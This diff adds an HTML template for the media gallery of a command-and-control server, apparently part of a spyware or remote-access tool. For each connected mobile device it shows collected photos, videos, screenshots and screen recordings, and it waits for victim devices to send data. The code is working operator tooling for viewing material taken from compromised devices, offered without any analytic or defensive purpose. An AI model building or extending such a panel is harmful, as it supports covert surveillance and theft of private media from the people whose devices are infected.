@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Gallery - C2 Server</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Simple Navigation -->
+        <nav class="navbar">
+            <div class="navbar-brand">
+                <i class="fas fa-skull"></i>
+                <span>C2 Control Panel</span>
+            </div>
+            <div class="navbar-menu">
+                <a href="/"><i class="fas fa-home"></i> Dashboard</a>
+                <a href="/gallery" class="active"><i class="fas fa-images"></i> Gallery</a>
+            </div>
+        </nav>
+
+        <h1 style="color: white; margin-bottom: 30px;">
+            <i class="fas fa-images"></i> Media Gallery
+        </h1>
+
+        {% for client in clients %}
+        <div class="gallery-section">
+            <h2 style="margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-mobile-alt"></i> Device: {{ client }}
+                <span style="font-size: 0.7em; background: var(--primary); color: white; padding: 3px 10px; border-radius: 20px;">
+                    {{ client_photos[client]|length + client_videos[client]|length + client_screenshots[client]|length + client_screen_recordings[client]|length }} items
+                </span>
+            </h2>
+
+            <!-- Gallery Tabs -->
+            <div class="gallery-tabs">
+                <button class="gallery-tab active" onclick="switchGalleryTab('{{ client }}-photos', this)">
+                    <i class="fas fa-image"></i> Photos ({{ client_photos[client]|length }})
+                </button>
+                <button class="gallery-tab" onclick="switchGalleryTab('{{ client }}-videos', this)">
+                    <i class="fas fa-video"></i> Videos ({{ client_videos[client]|length }})
+                </button>
+                <button class="gallery-tab" onclick="switchGalleryTab('{{ client }}-screenshots', this)">
+                    <i class="fas fa-camera"></i> C2 Screenshots ({{ client_screenshots[client]|length }})
+                </button>
+                <button class="gallery-tab" onclick="switchGalleryTab('{{ client }}-screen_recordings', this)">
+                    <i class="fas fa-film"></i> C2 Screen Recordings ({{ client_screen_recordings[client]|length }})
+                </button>
+            </div>
+
+            <!-- Photos Tab -->
+            <div id="{{ client }}-photos" class="gallery-content active">
+                {% if client_photos[client] %}
+                <div class="media-grid">
+                    {% for photo in client_photos[client] %}
+                    <div class="media-item">
+                        <img src="/photos/{{ client }}/{{ photo }}" alt="{{ photo }}" onclick="window.open(this.src, '_blank')">
+                        <div class="media-info">
+                            <i class="fas fa-image"></i> {{ photo[:30] }}{{ '...' if photo|length > 30 }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p style="color: var(--text-secondary); text-align: center; padding: 50px;">
+                    <i class="fas fa-image" style="font-size: 3em; margin-bottom: 10px; display: block;"></i>
+                    No photos found for this device
+                </p>
+                {% endif %}
+            </div>
+
+            <!-- Videos Tab (Regular Videos) -->
+            <div id="{{ client }}-videos" class="gallery-content">
+                {% if client_videos[client] %}
+                <div class="media-grid">
+                    {% for video in client_videos[client] %}
+                    <div class="media-item">
+                        <video controls>
+                            <source src="/videos/{{ client }}/{{ video }}" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                        <div class="media-info">
+                            <i class="fas fa-video"></i> {{ video[:30] }}{{ '...' if video|length > 30 }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p style="color: var(--text-secondary); text-align: center; padding: 50px;">
+                    <i class="fas fa-video" style="font-size: 3em; margin-bottom: 10px; display: block;"></i>
+                    No videos found for this device
+                </p>
+                {% endif %}
+            </div>
+
+            <!-- Screenshots Tab -->
+            <div id="{{ client }}-screenshots" class="gallery-content">
+                {% if client_screenshots[client] %}
+                <div class="media-grid">
+                    {% for screenshot in client_screenshots[client] %}
+                    <div class="media-item">
+                        <img src="/screenshots/{{ client }}/{{ screenshot }}" alt="{{ screenshot }}" onclick="window.open(this.src, '_blank')">
+                        <div class="media-info">
+                            <i class="fas fa-camera"></i> {{ screenshot[:30] }}{{ '...' if screenshot|length > 30 }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p style="color: var(--text-secondary); text-align: center; padding: 50px;">
+                    <i class="fas fa-camera" style="font-size: 3em; margin-bottom: 10px; display: block;"></i>
+                    No screenshots found for this device
+                </p>
+                {% endif %}
+            </div>
+
+            <!-- C2 Screen Recordings Tab -->
+            <div id="{{ client }}-screen_recordings" class="gallery-content">
+                {% if client_screen_recordings[client] %}
+                <div class="media-grid">
+                    {% for recording in client_screen_recordings[client] %}
+                    <div class="media-item">
+                        <video controls>
+                            <source src="/client/{{ client }}/screen_recordings/{{ recording }}" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                        <div class="media-info">
+                            <i class="fas fa-film"></i> {{ recording[:30] }}{{ '...' if recording|length > 30 }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p style="color: var(--text-secondary); text-align: center; padding: 50px;">
+                    <i class="fas fa-film" style="font-size: 3em; margin-bottom: 10px; display: block;"></i>
+                    No screen recordings found for this device
+                </p>
+                {% endif %}
+            </div>
+
+            <div style="margin-top: 20px; text-align: right;">
+                <a href="/client/{{ client }}" class="btn btn-primary">
+                    <i class="fas fa-folder-open"></i> View All Data
+                </a>
+            </div>
+        </div>
+        {% else %}
+        <div class="alert alert-warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            No devices connected yet. Waiting for data...
+        </div>
+        {% endfor %}
+    </div>
+
+    <script>
+        function switchGalleryTab(tabId, button) {
+            // Hide all tabs in this section
+            const tabs = button.parentElement.parentElement.querySelectorAll('.gallery-content');
+            tabs.forEach(tab => {
+                tab.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById(tabId).classList.add('active');
+
+            // Update button states
+            button.parentElement.querySelectorAll('.gallery-tab').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            button.classList.add('active');
+        }
+    </script>
+</body>
+</html>
